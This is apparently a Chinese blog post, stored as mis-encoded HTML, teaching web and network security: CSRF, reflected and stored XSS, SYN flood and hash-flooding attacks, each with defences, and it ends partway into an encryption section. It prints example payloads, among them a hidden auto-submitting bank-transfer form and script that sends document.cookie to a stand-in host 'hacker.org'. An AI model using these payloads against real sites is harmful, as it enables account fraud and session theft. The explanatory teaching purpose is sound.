    <content><![CDATA[<h2 id="ç½‘ç»œå®‰å…¨çš„åŸºæœ¬å±æ€§"><a href="#ç½‘ç»œå®‰å…¨çš„åŸºæœ¬å±æ€§" class="headerlink" title="ç½‘ç»œå®‰å…¨çš„åŸºæœ¬å±æ€§"></a>ç½‘ç»œå®‰å…¨çš„åŸºæœ¬å±æ€§</h2><ul>
<li>æœºå¯†æ€§ï¼šå‘é€æ–¹åŠ å¯†ï¼Œé¢„å®šæ¥æ”¶æ–¹è§£å¯†</li>
<li>èº«ä»½è®¤è¯ï¼šå‘é€æ–¹ä¸é¢„å®šæ¥æ”¶æ–¹èƒ½ç¡®å®šå½¼æ­¤èº«ä»½</li>
<li>å®Œæ•´æ€§ï¼šä¿¡æ¯ä¸ä¼šè¢«ç¯¡æ”¹ï¼Œå³ä½¿è¢«ç¯¡æ”¹äº†ä¹Ÿå¯ä»¥è¢«æ£€æµ‹å‡ºæ¥</li>
</ul>
<h2 id="å¸¸è§æ”»å‡»æ‰‹æ®µ"><a href="#å¸¸è§æ”»å‡»æ‰‹æ®µ" class="headerlink" title="å¸¸è§æ”»å‡»æ‰‹æ®µ"></a>å¸¸è§æ”»å‡»æ‰‹æ®µ</h2><ul>
<li>æ˜ å°„ï¼ˆMappingï¼‰ï¼šåˆ©ç”¨ ping ç¡®å®šç½‘ç»œä¸Šè¿è¡Œä¸»æœºçš„åœ°å€ï¼Œå†é€šè¿‡<strong>ç«¯å£æ‰«æ</strong>ä¾æ¬¡å°è¯•ä¸æ¯ä¸ªç«¯å£å»ºç«‹ TCP è¿æ¥ï¼Œæ‰¾å‡ºä¸»æœºåœ¨è¿è¡Œçš„æœåŠ¡</li>
<li>å—…æ¢ï¼ˆsniffingï¼‰ï¼šåœ¨å…±äº«ä»‹è´¨ç½‘ç»œä¸­ï¼Œæ”»å‡»æ–¹æ¥æ”¶æ‰€æœ‰ç»è¿‡å®ƒçš„åˆ†ç»„ï¼Œå±‚å±‚è§£æåå¾—åˆ°æ•°æ®<br><img src="https://i.loli.net/2020/02/06/s8lqcjTVEtJ4f5M.png" alt="åˆ†ç»„å—…æ¢"></li>
<li>IP æ¬ºéª—ï¼šä¿®æ”¹åˆ†ç»„çš„æº IP åœ°å€ï¼Œå†’å……å‘é€æ–¹</li>
<li>æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ï¼šå‘æ¥æ”¶æ–¹æ¶æ„æ³›æ´ªåˆ†ç»„ï¼Œæ·¹æ²¡æ¥æ”¶æ–¹ï¼ˆå¸¦å®½è€—å°½ã€èµ„æºè€—å°½ï¼‰<br><img src="https://i.loli.net/2020/02/06/CearKxmuZjUF1fz.png" alt="DDoS"><br><img src="https://i.loli.net/2020/02/06/TgOkCnZjJm1BEwX.png" alt="åå°„DDos"></li>
<li>ä¸­é—´äººæ”»å‡»ï¼šå¯¹æºä¸»æœºä¼ªè£…æˆç›®çš„ä¸»æœºï¼Œå¯¹ç›®çš„ä¸»æœºä¼ªè£…æˆæºä¸»æœº</li>
</ul>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRFï¼ˆCross-site request forgeryï¼‰ï¼Œä¸­æ–‡åç§°ï¼šè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¹Ÿè¢«ç§°ä¸ºï¼šone click attack/session ridingï¼Œç¼©å†™ä¸ºï¼šCSRF/XSRFã€‚</p>
<p>å› ä¸ºæµè§ˆå™¨åœ¨è®¿é—®ç½‘ç«™çš„æ—¶å€™ä¼šè‡ªåŠ¨å¸¦ä¸Š cookieï¼Œæ”»å‡»è€…é€šè¿‡å‘é€è·¨ç«™è¯·æ±‚ä½¿ç”¨æˆ·åœ¨ä¸çŸ¥ä¸è§‰ä¸­åœ¨å¦ä¸€ä¸ªç½‘ç«™å®ŒæˆæŸç§æ“ä½œã€‚è¿™ç§æ”»å‡»å°±ç§°ä¸º CSRFã€‚</p>
<p><img src="https://i.loli.net/2020/06/04/svxj1aRo9idAtgK.png" alt="CSRF"></p>
<p>ç”±æ­¤å¯è§ï¼Œè¦å®Œæˆä¸€æ¬¡ CSRFï¼Œå—å®³è€…éœ€è¦ç»å†ä¸€ä¸‹ä¸¤æ­¥ï¼š</p>
<ol>
<li>ç™»å½•å—ä¿¡ä»»ç½‘ç«™ Aï¼Œå¹¶åœ¨æœ¬åœ°ç”Ÿæˆ Cookieã€‚</li>
<li>åœ¨ä¸ç™»å‡º A çš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™ B</li>
</ol>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<p>é“¶è¡Œç½‘ç«™ Aï¼Œå®ƒä»¥ post è¯·æ±‚æ¥å®Œæˆé“¶è¡Œè½¬è´¦çš„æ“ä½œï¼Œå¦‚ï¼š<code>http://www.mybank.com/Transfer.php</code></p>
<p>å±é™©ç½‘ç«™Bï¼Œå®ƒé‡Œé¢æœ‰ä¸€æ®µ HTMLä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">ã€€ã€€<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">ã€€ã€€ã€€ã€€ã€€ã€€<span class="function"><span class="keyword">function</span> <span class="title">steal</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript">ã€€ã€€ã€€ã€€ã€€ã€€</span>&#123;</span></span><br><span class="line"><span class="javascript">          ã€€ã€€ã€€ã€€ iframe = <span class="built_in">document</span>.frames[<span class="string">&quot;steal&quot;</span>];</span></span><br><span class="line"><span class="javascript">ã€€ã€€     ã€€ã€€      iframe.document.Submit(<span class="string">&quot;transfer&quot;</span>);</span></span><br><span class="line"><span class="javascript">ã€€ã€€ã€€ã€€ã€€ã€€&#125;</span></span><br><span class="line"><span class="javascript">ã€€ã€€ã€€ã€€</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">ã€€ã€€<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;steal()&quot;</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;steal&quot;</span> <span class="attr">display</span>=<span class="string">&quot;none&quot;</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">name</span>=<span class="string">&quot;transfer&quot;</span>ã€€<span class="attr">action</span>=<span class="string">&quot;http://www.myBank.com/Transfer.php&quot;</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;toBankId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">ã€€ã€€<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœç”¨æˆ·å…ˆè®¿é—® A å†è®¿é—® Bï¼Œé‚£ä¹ˆç‚¹å‡»äº†è¿™ä¸ªå±é™©è¿æ¥ä¹‹åç”¨æˆ·å°±å°‘äº† 1000 å—ï¼å› ä¸ºè®¿é—® B ä¹‹å‰å·²ç»ç™»å½•äº† Aï¼Œè€Œ B èƒŒåœ°é‡Œæš—æ“æ“åœ°å‘ A å‘å‡º post è¯·æ±‚ï¼Œæ‰€ä»¥æµè§ˆå™¨ä¼šå¸¦ä¸Š A çš„ Cookie å»å‘ <code>http://www.mybank.com/Transfer.php</code> å‘å‡ºè¯·æ±‚ï¼Œç»“æœé“¶è¡Œç½‘ç«™æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªè½¬è´¦æ“ä½œï¼Œæ‰€ä»¥å°±ç«‹åˆ»è¿›è¡Œè½¬è´¦æ“ä½œâ€¦â€¦</p>
<p>å¦‚ä½•è¿›è¡Œé˜²æŠ¤ï¼š</p>
<ul>
<li>ä¸ºæ¯ä¸ªè¡¨å•æ·»åŠ ä¸€ä¸ªéšè—å­—æ®µä¿å­˜ä¼ªéšæœºæ•° tokenï¼Œæ¥æ”¶è¡¨å•æ—¶å…ˆéªŒè¯ token åˆæ³•æ€§ï¼Œè¿™æ ·æ”»å‡»è€…å°±æ— æ³•ä¼ªé€  post è¯·æ±‚äº†</li>
<li>æäº¤è¡¨å•éœ€è¦éªŒè¯ç ã€‚å…¶å®è¿™æ ·å’Œç”¨ token å·®ä¸å¤šï¼Œåªä¸è¿‡ä¸€ä¸ªåœ¨æ˜ä¸€ä¸ªåœ¨æš—</li>
<li>éªŒè¯ Referer å¤´éƒ¨</li>
</ul>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>XSS å…¨ç§°æ˜¯ Cross site scriptï¼Œå³è·¨ç«™è„šæœ¬ï¼Œä¸ºé¿å…ä¸ CSS æ··æ·†ç®€ç§° XSSã€‚</p>
<p>æ”»å‡»è€…åˆ©ç”¨ç½‘ç«™æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤æ•°æ®è¿›è¡Œè½¬ä¹‰å¤„ç†æˆ–è€…è¿‡æ»¤ä¸è¶³çš„ç¼ºç‚¹ï¼Œè¿›è€Œæ·»åŠ ä¸€äº›ä»£ç ï¼ŒåµŒå…¥åˆ° web é¡µé¢ä¸­ã€‚ä½¿åˆ«çš„ç”¨æˆ·è®¿é—®é¡µé¢éƒ½ä¼šæ‰§è¡Œç›¸åº”çš„åµŒå…¥ä»£ç ã€‚ä»è€Œç›—å–ç”¨æˆ· cookieã€å¯¹è®¿é—®è€…è¿›è¡Œç—…æ¯’ä¾µå®³çš„ä¸€ç§æ”»å‡»æ–¹å¼ã€‚</p>
<p>æŠŠä»£ç åµŒå…¥ç½‘é¡µçš„åœºæ™¯å…¶å®å¾ˆå¸¸è§ã€‚æƒ³è±¡ä¸€ä¸ªè¿™æ ·çš„åœºæ™¯ï¼šç”¨æˆ·åœ¨æŸä¸ªè®ºå›å›å¸–ï¼Œä»–å›å¤çš„å†…å®¹å°±ä¼šåµŒå…¥åˆ°è¿™ä¸ªç½‘é¡µä¸­å»ã€‚å¦‚æœæœåŠ¡å™¨ä¸å¯¹ç”¨æˆ·çš„è¾“å…¥åšè¿‡æ»¤ï¼Œä¸€æ—¦å›å¤çš„å†…å®¹æ˜¯ä¸€æ®µæœ‰æ¶æ„çš„ä»£ç ï¼Œè¿™æ®µä»£ç å°±ä¼šå½±å“æ‰€æœ‰è®¿é—®è¿™ä¸ªç½‘é¡µçš„äººã€‚</p>
<h4 id="åå°„æ€§-XSS"><a href="#åå°„æ€§-XSS" class="headerlink" title="åå°„æ€§ XSS"></a>åå°„æ€§ XSS</h4><p>åˆç§°ä¸ºéæŒä¹…æ€§è·¨ç«™ç‚¹è„šæœ¬æ”»å‡»ï¼Œå®ƒæ˜¯æœ€å¸¸è§çš„ XSSï¼Œç‰¹å¾æ˜¯æ”»å‡»è€…æ³¨å…¥çš„æ•°æ®ååº”åœ¨å“åº”ä¸­ã€‚ä¸€ä¸ªå…¸å‹çš„éæŒä¹…æ€§ XSS åŒ…å«ä¸€ä¸ªå¸¦ XSS æ”»å‡»å‘é‡çš„é“¾æ¥(å³æ¯æ¬¡æ”»å‡»éœ€è¦ç”¨æˆ·çš„ç‚¹å‡»)</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·è®¿é—® <code>http://example.org?search=hello</code> ä¼šæ˜¾ç¤º search å‚æ•°çš„å€¼å³ â€œhelloâ€ã€‚ç„¶è€Œï¼Œä¸€æ—¦æ”»å‡»è€…æŠŠè¿™æ ·çš„åœ°å€åµŒå…¥åˆ°ç½‘é¡µä¸­ <code>http://example.org?search=&lt;script&gt;src=&#39;http://hacker.com/xss.js&#39;&lt;/script&gt;</code>ï¼Œè¯·æ±‚å“åº”ä¸­å°±ä¼šåŒ…å«å¹¶æ‰§è¡Œè¿™æ ·ä¸€æ®µ js ä»£ç  <code>&lt;script&gt;src=&#39;http://hacker.com/xss.js&#39;&lt;/script&gt;</code>ï¼Œä¸€æ—¦ xss.js åŒ…å«äº†æ¶æ„æ“ä½œï¼Œç”¨æˆ·ä¿¡æ¯å°±è¢«æ³„éœ²äº†ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// xss.js æ–‡ä»¶ä¸­çš„ä»£ç </span></span><br><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">img.width = <span class="number">0</span>;</span><br><span class="line">img.height = <span class="number">0</span>;</span><br><span class="line">img.src = <span class="string">&#x27;http://hacker.org/xss?cookie=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie); <span class="comment">// çªƒå–ç”¨æˆ· cookie</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h4 id="å­˜å‚¨æ€§-XSS"><a href="#å­˜å‚¨æ€§-XSS" class="headerlink" title="å­˜å‚¨æ€§ XSS"></a>å­˜å‚¨æ€§ XSS</h4><p>åˆç§°ä¸ºæŒä¹…å‹è·¨ç«™ç‚¹è„šæœ¬ã€‚ä¸åå°„æ€§ XSS é ç”¨æˆ·ç‚¹å‡»è§¦å‘ä¸åŒï¼Œå­˜å‚¨æ€§ XSS æŠŠæ”»å‡»è„šæœ¬å­˜å‚¨åœ¨ç½‘é¡µä¸­ï¼Œæ¯æ¬¡ç”¨æˆ·è®¿é—®è¿™ä¸ªç½‘é¡µéƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œæ¶æ„ä»£ç è¿›è¡Œæ”»å‡»ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼šç”¨æˆ·åœ¨ç•™è¨€æ¿ä¸­æ­£å¸¸å›å¤æ˜¯è¿™æ ·çš„</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€œtextâ€</span> <span class="attr">name</span>=<span class="string">â€œcontentâ€</span> <span class="attr">value</span>=<span class="string">â€œè¿™é‡Œæ˜¯ç”¨æˆ·å¡«å†™çš„æ•°æ®â€</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœåŠ¡å™¨æŠŠ value å‚¨å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œè¿™æ ·æ¯æ¬¡ç”¨æˆ·è®¿é—®è¿™ä¸ªé¡µé¢éƒ½å¯ä»¥çœ‹åˆ°è¿™æ¡å›å¤ã€‚è€Œæ”»å‡»è€…å¯ä»¥åœ¨ value ä¸­å¡«å…¥ä»¥ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">å“ˆå“ˆå“ˆï¼Œæœ‰è¶£æœ‰è¶£</span><br><span class="line">&lt;script&gt;src=<span class="string">&#x27;http://hacker.com/xss.js&#x27;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæœåŠ¡å™¨ä¹ŸæŠŠè¿™æ®µä»£ç å…¥åº“å¹¶ä¸”åµŒå…¥åˆ°ç½‘é¡µï¼Œé‚£ä¹ˆæ¯å½“ç”¨æˆ·è®¿é—®è®¿é—®è¿™æ¡ç•™è¨€éƒ½ä¼šæ‰§è¡Œ xss.js ä¸­çš„ä»£ç ã€‚</p>
<p>å¦‚ä½•è¿›è¡Œé˜²æŠ¤ï¼š</p>
<ul>
<li>è®¾ç½® Cookie çš„å±æ€§ä¸º <code>Http only</code>ï¼Œè¿™æ · js å°±æ— æ³•è·å– Cookie å€¼</li>
<li>ä¸¥æ ¼æ£€æŸ¥è¡¨å•æäº¤çš„ç±»å‹ã€‚æ¯”å¦‚ age å­—æ®µä¸€å®šè¦æ˜¯æ•°å­—</li>
<li>è¿‡æ»¤æˆ–ç§»é™¤ç‰¹æ®Šçš„ HTML æ ‡ç­¾ï¼Œå¦‚ <code>&lt;script&gt;</code>ã€<code>&lt;iframe&gt;</code></li>
<li>å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®å°±è¡Œ <code>Html Encode</code> å¤„ç†ï¼Œå°†å…¶è½¬æ¢ä¸º HTML å®ä½“å­—ç¬¦çš„æ™®é€šæ–‡æœ¬ã€‚æ¯”å¦‚ <code>&lt;</code> è½¬æ¢ä¸º <code>&amp;lt</code>ï¼Œ<code>&quot;</code> è½¬æ¢ä¸º <code>&amp;quot</code></li>
</ul>
<h3 id="æ‹’ç»æœåŠ¡æ”»å‡»"><a href="#æ‹’ç»æœåŠ¡æ”»å‡»" class="headerlink" title="æ‹’ç»æœåŠ¡æ”»å‡»"></a>æ‹’ç»æœåŠ¡æ”»å‡»</h3><p>æ‹’ç»æœåŠ¡æ”»å‡»å³æ˜¯æ”»å‡»è€…æƒ³åŠæ³•è®©ç›®æ ‡æœºå™¨åœæ­¢æä¾›æœåŠ¡ï¼Œåªè¦èƒ½å¤Ÿå¯¹ç›®æ ‡é€ æˆéº»çƒ¦ï¼Œä½¿æŸäº›æœåŠ¡è¢«æš‚åœç”šè‡³ä¸»æœºæ­»æœºï¼Œéƒ½å±äºæ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p>
<p>æ‹’ç»æœåŠ¡æ”»å‡»é—®é¢˜ä¸€ç›´å¾—ä¸åˆ°åˆç†çš„è§£å†³ï¼Œç©¶å…¶åŸå› æ˜¯å› ä¸ºç½‘ç»œåè®®æœ¬èº«çš„å®‰å…¨ç¼ºé™·ï¼Œä»è€Œæ‹’ç»æœåŠ¡æ”»å‡»ä¹Ÿæˆä¸ºäº†æ”»å‡»è€…çš„ç»ˆææ‰‹æ³•ã€‚æ”»å‡»è€…è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ï¼Œå®é™…ä¸Šè®©æœåŠ¡å™¨å®ç°ä¸¤ç§æ•ˆæœï¼šä¸€æ˜¯è¿«ä½¿æœåŠ¡å™¨çš„ç¼“å†²åŒºæ»¡ï¼Œä¸æ¥æ”¶æ–°çš„è¯·æ±‚ï¼›äºŒæ˜¯ä½¿ç”¨IPæ¬ºéª—ï¼Œè¿«ä½¿æœåŠ¡å™¨æŠŠéæ³•ç”¨æˆ·çš„è¿æ¥å¤ä½ï¼Œå½±å“åˆæ³•ç”¨æˆ·çš„è¿æ¥ã€‚</p>
<h4 id="SYN-æ´ªæ°´æ”»å‡»"><a href="#SYN-æ´ªæ°´æ”»å‡»" class="headerlink" title="SYN æ´ªæ°´æ”»å‡»"></a>SYN æ´ªæ°´æ”»å‡»</h4><p>SYN Flood æ˜¯ä¸€ç§å¹¿ä¸ºäººçŸ¥çš„æ”»å‡»ï¼Œå› ä¸ºç°åœ¨å»ºç«‹ TCP è¿æ¥éƒ½è¦ç»å†éƒ½æ˜¯é‡‡ç”¨ä¸‰æ¬¡æ¡æ‰‹æ‰€ä»¥å¯¹ç°ä»£ç½‘ç»œä¸å¤ªæœ‰æ•ˆã€‚</p>
<p>SYN Flood æ”»å‡»ç›®å‰æœ‰ä¸¤ç§æ–¹æ³•ï¼Œéƒ½ä¸æœåŠ¡å™¨æ²¡æ”¶åˆ° ACK æœ‰å…³ã€‚æ¶æ„ç”¨æˆ·å¯ä»¥è·³è¿‡ä¼ é€æœ€åçš„ ACK ä¿¡æ¯æˆ–è€…åœ¨ SYN é‡Œé€šè¿‡æ¬ºéª—æ¥æº IP åœ°å€ï¼Œè®©æœåŠ¡å™¨é€ SYN-ACK åˆ°å‡çš„ IP åœ°å€ï¼Œå› æ­¤æ°¸ä¸å¯èƒ½æ”¶åˆ° ACKã€‚å¤§é‡åŠå¼€çŠ¶æ€çš„ TCP è¿æ¥å ç”¨äº†æœåŠ¡å™¨å…¨éƒ¨èµ„æºï¼Œæ­£å¸¸ç”¨æˆ·çš„è®¿é—®è¢«æ‹’ç»ã€‚</p>
<p>é˜²å¾¡ SYN Flood æœ‰å‡ ç§ç®€å•çš„åŠæ³•ï¼š</p>
<ol>
<li>ç¼©çŸ­ SYN Timeout æ—¶é—´ï¼šç”±äº SYN Flood æ”»å‡»çš„æ•ˆæœå–å†³äºæœåŠ¡å™¨ä¸Šä¿æŒçš„ SYN åŠè¿æ¥æ•°ï¼Œè¿™ä¸ªå€¼ç­‰äº SYN æ”»å‡»çš„é¢‘åº¦ Ã— SYN Timeoutï¼Œæ‰€ä»¥é€šè¿‡ç¼©çŸ­ SYN åŠè¿æ¥çŠ¶æ€çš„æ—¶é—´å¯ä»¥å¤§å¤§é™ä½æœåŠ¡å™¨å‹åŠ›ã€‚</li>
<li>è®¾ç½® SYN Cookieï¼šè®¾ç½® SYN Cookie å°±æ˜¯ç»™æ¯ä¸€ä¸ªè¯·æ±‚è¿æ¥çš„ IP åœ°å€åˆ†é…ä¸€ä¸ª Cookieï¼Œå¦‚æœçŸ­æ—¶é—´å†…è¿ç»­å—åˆ°æŸä¸ª IP çš„é‡å¤ SYN æŠ¥æ–‡ï¼Œå°±è®¤å®šæ˜¯å—åˆ°äº†æ”»å‡»ï¼Œä»¥åä»è¿™ä¸ª IP åœ°å€å‘æ¥çš„åŒ…ä¼šè¢«ä¸¢å¼ƒã€‚</li>
</ol>
<p>ä¸Šè¿°çš„ä¸¤ç§æ–¹æ³•åªèƒ½å¯¹ä»˜æ¯”è¾ƒåŸå§‹çš„ SYN Floodï¼Œç¼©çŸ­ SYN Timeout æ—¶é—´ä»…ä¼šåœ¨å¯¹æ–¹æ”»å‡»é¢‘åº¦ä¸é«˜çš„æƒ…å†µä¸‹ç”Ÿæ•ˆï¼ŒSYN Cookie æ›´ä¾èµ–äºå¯¹æ–¹ä½¿ç”¨çœŸå®çš„ IP åœ°å€ï¼Œå¦‚æœæ”»å‡»è€…ä»¥æ•°ä¸‡/ç§’çš„é€Ÿåº¦å‘é€ SYN æŠ¥æ–‡ï¼ŒåŒæ—¶åˆ©ç”¨ SOCK_RAW éšæœºæ”¹å†™ IP æŠ¥æ–‡ä¸­çš„æºåœ°å€ï¼Œä»¥ä¸Šçš„æ–¹æ³•å°†æ¯«æ— ç”¨æ­¦ä¹‹åœ°ã€‚</p>
<h4 id="å“ˆå¸Œæ´ªæ°´æ”»å‡»"><a href="#å“ˆå¸Œæ´ªæ°´æ”»å‡»" class="headerlink" title="å“ˆå¸Œæ´ªæ°´æ”»å‡»"></a>å“ˆå¸Œæ´ªæ°´æ”»å‡»</h4><p>ä½¿ç”¨æ‹‰é“¾æ³•å®ç°çš„ hash è¡¨æœ€åæƒ…å†µä¸‹æ’å…¥ n ä¸ªå€¼çš„æ—¶é—´å¤æ‚åº¦ä¸º O(n^2)ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œå¦‚æœæ”»å‡»è€…æŒæ¡äº†æœåŠ¡å™¨ä½¿ç”¨çš„æ•£åˆ—å‡½æ•°èƒŒåçš„å®ç°åŸç†ï¼Œå°±å¯ä»¥è½»æ˜“æ„å»ºå‡ºä¸€æ‰¹å…·æœ‰ç›¸åŒæ•£åˆ—ç çš„å€¼ï¼Œè®©æœåŠ¡å™¨æŠŠèµ„æºå…¨éƒ¨è€—è´¹åœ¨ hash è¡¨çš„æ’å…¥æ“ä½œä¸Šã€‚ä¾ 2011 å¹´çš„å®éªŒæ•°æ®ï¼Œæ”»å‡»ä¸€å°åŸºäº Javaï¼ˆTomcatï¼‰çš„æœåŠ¡å™¨æ—¶ï¼Œä»…ä»…éœ€è¦ 6KB/s çš„æµé‡å°±èƒ½æ‰“ç˜«ä¸€é¢— Intel i7 å¤„ç†å™¨ï¼Œ1GB/s çš„æµé‡å¯ä»¥æ‰“ç˜« 100000 é¢— Intel i7 å¤„ç†å™¨ï¼Œæ€§ä»·æ¯”è¿œè¶… TCP åŠå¼€è¿æ¥ç­‰ä¼ ç»Ÿçš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p>
<p>é˜²å¾¡å“ˆå¸Œæ´ªæ°´æ”»å‡»ï¼š</p>
<ul>
<li>ä½¿ç”¨å¸¦å¯†é’¥å“ˆå¸Œç®—æ³•ï¼šå¦‚æœæ”»å‡»è€…ä¸èƒ½æŒæ¡æ•£åˆ—å‡½æ•°æ‰€æœ‰ç»†èŠ‚ï¼Œå°±ä¸èƒ½ç»™å‡ºä¸€ç»„é¢‘ç¹ç¢°æ’çš„é”®ï¼Œä¹Ÿå°±æ— æ³•å‘åŠ¨å“ˆå¸Œæ´ªæ°´æ”»å‡»ã€‚å¦‚æœåœ¨æ•£åˆ—å‡½æ•°ä¸­åŠ å…¥ä¸€ä¸ªç§˜å¯†å‚æ•°ï¼Œæ¯å»ºä¸€å¼ å“ˆå¸Œè¡¨å°±éšæœºç”Ÿæˆä¸€ä¸ªæ–°çš„ç§˜å¯†å‚æ•°ã€‚è¿™æ ·ä¸€æ¥ï¼Œå³ä½¿æ˜¯åŒæ ·çš„å†…å®¹ï¼Œæ”¾åœ¨ä¸åŒçš„è¡¨é‡Œä¹Ÿä¼šäº§ç”Ÿå®Œå…¨ä¸åŒçš„å†…å­˜åˆ†é…ã€‚è¿™æ•´ä¸ªè¿‡ç¨‹æ”»å‡»è€…å®Œå…¨æ— æ³•é¢„æµ‹ï¼Œå³ä½¿å‘ç”Ÿç¢°æ’ï¼Œä¹Ÿæ˜¯å°æ¦‚ç‡çš„å·§åˆï¼Œè€Œä¸æ˜¯é»‘å®¢åœ¨ä¸»åŠ¨æ§åˆ¶ï¼Œæ”»å‡»ä¹Ÿå°±ä¸å¯èƒ½æˆç«‹äº†ã€‚è¿™ä¸ªç§˜å¯†å‚æ•°ç§°ä¸ºå“ˆå¸Œç§å­ï¼ˆHash Seedï¼‰ï¼Œè€Œè¿™ç±»ä½¿ç”¨å“ˆå¸Œç§å­çš„å“ˆå¸Œç®—æ³•ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºå¸¦å¯†é’¥å“ˆå¸Œç®—æ³•ï¼ˆKeyed Hash Functionï¼‰</li>
<li>æ¢ä¸€ç§ hash è¡¨çš„å®ç°æ–¹å¼ï¼šJDK 8 ä½¿ç”¨äº†ä¸€ç§æ–°çš„é€»è¾‘æ¥æ„å»º hash è¡¨ã€‚å½“ä¸€ä¸ªä½ç½®å­˜å‚¨çš„å…ƒç´ ä¸ªæ•°å°äº8ä¸ªæ—¶ï¼Œä»ç„¶ä½¿ç”¨é“¾è¡¨å­˜å‚¨ï¼›å½“ä¸€ä¸ªä½ç½®å­˜å‚¨çš„å…ƒç´ ä¸ªæ•°å¤§äºç­‰äº8ä¸ªæ—¶ï¼Œæ”¹ä¸ºä½¿ç”¨å¹³è¡¡æ ‘æ¥å­˜å‚¨ã€‚è¿™æ ·å°±å¯ä»¥ä¿è¯æœ€å·®çš„æ’å…¥æ—¶é—´æ˜¯ O(nlogn) äº†ã€‚ä¸ºä»€ä¹ˆè¦è®¾ç«‹â€œ8ä¸ªå…ƒç´ â€è¿™æ ·ä¸€ä¸ªé™åˆ¶å‘¢ï¼Ÿå› ä¸ºå¹³è¡¡æ ‘ç›¸æ¯”é“¾è¡¨è€Œè¨€æœ‰ç€æ›´é«˜çš„å¼€é”€ï¼Œä»¥åŠæ›´æ•£ä¹±çš„å†…å­˜å¸ƒå±€ï¼ˆå½±å“ç¼“å­˜å‘½ä¸­ç‡ï¼‰ã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå“ˆå¸Œè¡¨çš„ä¸€ä¸ªä½ç½®å¤§çº¦åªä¼šå­˜å‚¨ 1~4 ä¸ªå·¦å³çš„å…ƒç´ ï¼Œæ‰€ä»¥æ²¡æœ‰å¿…è¦ä¸“é—¨å¼€ä¸€ä¸ªå¹³è¡¡æ ‘æ¥å­˜å‚¨å†²çªçš„å…ƒç´ ï¼Œå¯¹ä¸€äº›æ€§èƒ½æ•æ„Ÿçš„åº”ç”¨æ¥è¯´ä¼šé€ æˆæ˜¾è‘—çš„è´Ÿé¢å½±å“ã€‚</li>
</ul>
<h2 id="åŠ å¯†ä¸è§£å¯†"><a href="#åŠ å¯†ä¸è§£å¯†" class="headerlink" title="åŠ å¯†ä¸è§£å¯†"></a>åŠ å¯†ä¸è§£å¯†</h2><ul>
<li>æ˜æ–‡ï¼šæ²¡æœ‰è¿›è¿‡åŠ å¯†çš„æ•°æ®</li>
